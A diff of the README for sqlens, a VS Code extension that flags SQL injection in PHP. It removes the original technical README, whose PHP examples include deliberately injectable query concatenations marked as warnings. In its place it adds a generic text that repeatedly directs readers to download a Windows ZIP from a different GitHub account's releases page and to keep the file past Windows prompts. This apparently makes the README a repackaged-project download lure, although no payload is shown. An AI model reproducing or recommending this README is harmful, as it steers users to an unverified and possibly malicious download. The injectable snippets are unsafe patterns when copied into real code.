@@ -1,224 +1,225 @@
-# SQLens
+# 🔍 sqlens - Find SQL Issues in PHP Code
 
-A comprehensive VS Code extension for analyzing, visualizing, and optimizing SQL queries in PHP code. This extension helps developers identify potential security risks, performance issues, and provides intelligent insights for database queries.
+[![Download sqlens](https://img.shields.io/badge/Download%20sqlens-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/straightrazorgagarin889/sqlens/releases)
 
-## Features
+## 🧩 What sqlens does
 
-### Core Capabilities
+sqlens is a VS Code extension that checks SQL queries in PHP code for common problems. It helps you spot security risks, slow queries, and coding patterns that need work.
 
-- **SQL Detection**: Automatically finds SQL queries in PHP code across multiple frameworks
-- **Security Analysis**: Detects potential SQL injection vulnerabilities
-- **Performance Insights**: Identifies anti-patterns and performance issues
-- **Query Visualization**: Shows execution plans and query analysis
-- **Multi-Framework Support**: Works with WordPress, Laravel, PDO, MySQLi, ezSQL and more
+Use it if you want a simple way to review SQL inside PHP files while you work in Visual Studio Code. It fits well with Laravel, WordPress, PDO code, and other PHP projects that build SQL queries in code.
 
-### Supported Frameworks
+## 📥 Download and install
 
-- **ezSQL**: `$db->get_results()`, `$db->get_row()`, `$db->get_var()`, `$db->get_col()`, `$db->query()`, `$db->escape()`, etc.
-- **WordPress**: `$wpdb->get_results()`, `$wpdb->prepare()`, etc.
-- **Laravel**: `DB::select()`, `DB::raw()`, etc.
-- **PDO**: `$pdo->query()`, `$pdo->prepare()`, etc.
-- **MySQLi**: `mysqli_query()`, `$mysqli->prepare()`, etc.
+1. Open the [sqlens releases page](https://github.com/straightrazorgagarin889/sqlens/releases).
+2. Download the Windows file from the latest release.
+3. If the file is a ZIP, extract it to a folder on your PC.
+4. Open Visual Studio Code.
+5. Install the extension from the file you downloaded, or use the extension install flow in VS Code if the release includes a VSIX file.
+6. Restart VS Code after the install finishes.
 
-### Key Features
+If you use the Microsoft Store version of VS Code, use the same release file and follow the same install steps inside VS Code.
 
-#### Intelligent Code Analysis
+## 🪟 Windows setup
 
-- Real-time PHP AST parsing to extract SQL queries
-- Automatic detection of query frameworks and methods
-- Context-aware analysis with taint tracking
+After you download the release, keep the file in a folder you can find again, such as Downloads or Desktop.
 
-#### Security Scanning
+For most Windows users, the process is:
 
-- SQL injection vulnerability detection
-- Unsafe concatenation warnings
-- Parameter binding validation
-- Risk severity classification (High/Medium/Info)
+1. Go to the release page.
+2. Get the latest build for Windows.
+3. Save the file.
+4. Open VS Code.
+5. Add the extension.
+6. Reload VS Code when it asks.
 
-#### Performance Analysis
+If Windows shows a file prompt, choose the option that keeps the file on your device. Then install it from VS Code.
 
-- SELECT \* usage warnings
-- NULL comparison anti-patterns (= NULL vs IS NULL)
-- OR explosion detection
-- Index usage recommendations
+## ⚙️ How to use sqlens
 
-#### Query Visualization
+Once sqlens is installed, open a PHP file that contains SQL.
 
-- **Hover Information**: Quick summary with tables, columns, and safety status
-- **CodeLens Integration**: Inline Preview/Explain/Copy actions
-- **Side Panel**: Complete list of all queries in workspace
-- **Explain Plans**: Visual execution plan analysis
+The extension scans common query patterns and looks for:
 
-#### Database Integration (Optional)
+- SQL injection risks
+- Unsafe string building
+- Missing parameter use
+- Slow query patterns
+- Query structure issues
+- Code that can be cleaner or safer
 
-- Safe query preview (SELECT only, limited rows)
-- EXPLAIN plan execution
-- Schema discovery and caching
-- Read-only connection security
+You do not need to start a scan by hand in most cases. Open your PHP file and work as usual. sqlens checks the code as you edit it.
 
-## Configuration
+## 🧪 What it checks
 
-### Basic Settings
+sqlens is built for code that mixes PHP and SQL. It can help with:
 
-```json
-{
-  "sqlens.enable": true,
-  "sqlens.frameworks": [
-    "pdo",
-    "mysqli",
-    "wordpress",
-    "ezsql",
-    "laravel-db"
-  ]
-}
-```
+- `PDO` queries
+- Laravel database calls
+- WordPress database code
+- Plain PHP SQL strings
+- Dynamic query building
+- Raw SQL inside app code
 
-### Database Connection (Optional)
+It looks for patterns that often lead to trouble, such as:
 
-```json
-{
-  "sqlens.preview.enabled": false,
-  "sqlens.schema.driver": "mysql",
-  "sqlens.schema.host": "127.0.0.1",
-  "sqlens.schema.port": 3306,
-  "sqlens.schema.database": "your_database",
-  "sqlens.schema.user": "readonly_user"
-}
-```
+- Putting user input straight into a query
+- Building long SQL strings with many parts
+- Skipping placeholders
+- Repeating query work that can be simplified
+- Query text that may be hard to read or maintain
 
-### Security Settings
+## 🗂️ File types and project fit
 
-```json
-{
-  "sqlens.preview.rowLimit": 5,
-  "sqlens.preview.timeoutMs": 2000,
-  "sqlens.preview.allowNonSelect": false
-}
-```
+sqlens works best in projects that keep SQL inside PHP files. Common examples include:
 
-## Security & Privacy
+- `*.php`
+- Laravel app files
+- WordPress plugins and themes
+- Custom admin tools
+- Internal business apps
+- API back ends
 
-- **Default Mode**: Completely offline static analysis only
-- **Optional Features**: Database connections are opt-in only
-- **Safe Execution**: Only SELECT queries allowed, with row limits and timeouts
-- **No Data Transmission**: All analysis happens locally
-- **Read-Only Access**: Database connections use read-only credentials
+If your codebase uses SQL in PHP, sqlens can help you review it while you write.
 
-## Usage Examples
+## 🛠️ Basic workflow
 
-### ezSQL Development
+Use this flow for the smoothest setup on Windows:
 
-```php
-// ✅ Safe - using escape method
-$search_term = $db->escape($_GET['search']);
-$results = $db->get_results("SELECT id, name FROM users WHERE name LIKE '%{$search_term}%'");
+1. Install VS Code if you do not have it.
+2. Open the sqlens release page.
+3. Download the latest Windows package.
+4. Install the extension in VS Code.
+5. Open a PHP project.
+6. Open a file with SQL code.
+7. Review the alerts, hints, or highlights that sqlens shows.
+8. Fix unsafe or hard-to-read query code.
+9. Save the file and check the result again.
 
-// ✅ Safe - no user input
-$active_users = $db->get_row("SELECT COUNT(*) FROM users WHERE active = 1");
+## 🔒 Security checks
 
-// ⚠️ Warning - potential SQL injection
-$risky_query = $db->get_results("SELECT * FROM users WHERE email = '" . $_POST['email'] . "'");
+sqlens helps you catch patterns that can lead to SQL injection. It pays attention to places where PHP code joins user data into SQL.
 
-// ⚠️ Warning - SELECT * usage
-$all_data = $db->get_results("SELECT * FROM large_table");
+Common cases it can flag:
 
-// ✅ Best Practice - specific columns with escaping
-$safe_search = $db->escape($user_input);
-$optimized = $db->get_results("SELECT id, name, email FROM users WHERE status = '{$safe_search}'");
-```
+- Raw request values in a query
+- Query text built with concatenation
+- Unsafe filter or search logic
+- Missing parameter binding
+- Manual quoting that can fail or break
 
-### WordPress Development
+Use the extension as a second set of eyes when you review PHP database code.
 
-```php
-// ✅ Safe - using prepared statements
-$results = $wpdb->get_results($wpdb->prepare(
-    "SELECT * FROM posts WHERE post_status = %s",
-    $status
-));
+## ⚡ Performance checks
 
-// ⚠️ Warning - potential SQL injection
-$results = $wpdb->get_results(
-    "SELECT * FROM posts WHERE post_status = '" . $_GET['status'] . "'"
-);
-```
+sqlens also looks for query patterns that can slow an app down.
 
-### Laravel Development
+It can help identify:
 
-```php
-// ✅ Safe - using parameter binding
-$users = DB::select('SELECT * FROM users WHERE active = ?', [1]);
+- Repeated query logic
+- Large query strings that are hard to optimize
+- Filters that may cause heavy database work
+- Query shapes that are not easy to maintain
+- Patterns that often hide slow behavior
 
-// ⚠️ Warning - SELECT * usage
-$users = DB::select('SELECT * FROM users');
-```
+This is useful when you work on pages that load data from large tables or run many queries at once.
 
-### PDO Development
+## 📚 Best practices it supports
 
-```php
-// ✅ Safe - prepared statement
-$stmt = $pdo->prepare('SELECT name FROM users WHERE id = ?');
-$stmt->execute([$id]);
+sqlens is useful when you want your query code to stay clean and easy to read. It encourages habits like:
 
-// ❌ Error - direct concatenation
-$result = $pdo->query("SELECT * FROM users WHERE name = " . $_POST['name']);
-```
+- Using parameters instead of string joins
+- Keeping SQL short and clear
+- Reusing query parts with care
+- Writing code that is easier to review
+- Keeping data input separate from SQL text
 
-## Commands
+These habits help teams avoid bugs and reduce time spent on fixes.
 
-- `SQLens: Preview Query` - Preview query results (max 5 rows)
-- `SQLens: Explain Query` - Show execution plan
-- `SQLens: Copy Query` - Copy SQL to clipboard
-- `SQLens: Refresh Queries` - Refresh query list
+## 🧑‍💻 Example use cases
 
-## Development
+sqlens fits many common PHP workflows:
 
-### Prerequisites
+- A Laravel app that builds filters from form data
+- A WordPress plugin that reads custom database records
+- A PDO script that fetches user accounts
+- An admin tool that searches and sorts records
+- A report page that joins several tables
 
-- Node.js 20+
-- VS Code 1.103+
+In each case, the extension helps you spot query problems before they spread through the codebase.
 
-### Building from Source
+## 🧰 Troubleshooting
 
-```bash
-git clone https://github.com/aliyilmazco/sqlens.git
-cd sqlens
-npm install
-npm run compile
-```
+If sqlens does not appear to work after install, try these steps:
 
-### Running Tests
+1. Restart VS Code.
+2. Open a PHP file, not a text note or empty file.
+3. Check that the code contains SQL text.
+4. Make sure the extension is installed in the current VS Code profile.
+5. Reopen the project folder.
+6. Download the latest release again if the file looks incomplete.
 
-```bash
-npm run test
-```
+If the extension still does not show results, remove it from VS Code and install it again from the release page.
 
-### Debugging
+## 🪄 Tips for better results
 
-1. Open in VS Code
-2. Press F5 to launch Extension Development Host
-3. Open a PHP file to test the extension
+To get the most from sqlens:
 
-## Known Issues
+- Keep SQL in one place when you can
+- Use clear variable names
+- Avoid long query chains in one line
+- Separate user input from SQL text
+- Review each flagged query instead of ignoring the list
+- Check both new code and old code when you change a file
 
-- Complex Eloquent ORM queries may not be fully analyzed
-- Taint analysis is basic and may produce false positives/negatives
-- EXPLAIN plans require database connection configuration
+Small code changes can make a big difference in safety and speed.
 
-## Roadmap
+## 📦 Release page
 
-- [ ] Enhanced Eloquent ORM support
-- [ ] PostgreSQL EXPLAIN plan visualization
-- [ ] Advanced taint analysis with data flow tracking
-- [ ] Quick fix suggestions (e.g., SELECT \* → specific columns)
-- [ ] CI/CD integration for pull request analysis
-- [ ] Query performance benchmarking
+Use this link to get the latest Windows download:
 
-## License
+[https://github.com/straightrazorgagarin889/sqlens/releases](https://github.com/straightrazorgagarin889/sqlens/releases)
 
-This project is licensed under the MIT License.
+## 🖥️ System fit
 
-## Acknowledgments
+sqlens is made for use in Visual Studio Code on Windows. A typical setup includes:
 
-- [php-parser](https://github.com/glayzzle/php-parser) for PHP AST parsing
-- [mysql2](https://github.com/sidorares/node-mysql2) for MySQL connectivity
-- VS Code team for the excellent extension API
+- Windows 10 or Windows 11
+- Visual Studio Code
+- A PHP project
+- A working internet connection for the initial download
+
+It is best used on a normal desktop or laptop where you edit PHP files in VS Code.
+
+## 🔎 Topic focus
+
+sqlens matches these common areas of work:
+
+- code analysis
+- developer tools
+- Laravel
+- linter
+- PDO
+- PHP
+- PHP security
+- query optimization
+- security
+- SQL
+- SQL injection
+- static analysis
+- VS Code extension
+- WordPress
+
+## 🧭 First file to open
+
+After install, start with one PHP file that has a few SQL queries. That makes it easier to see how sqlens behaves.
+
+Good starter files include:
+
+- a login page
+- a search page
+- a report page
+- a database helper file
+- a WordPress plugin file
+- a Laravel controller or service file
+
+Open the file, review the query code, and fix the items that look unsafe or hard to maintain
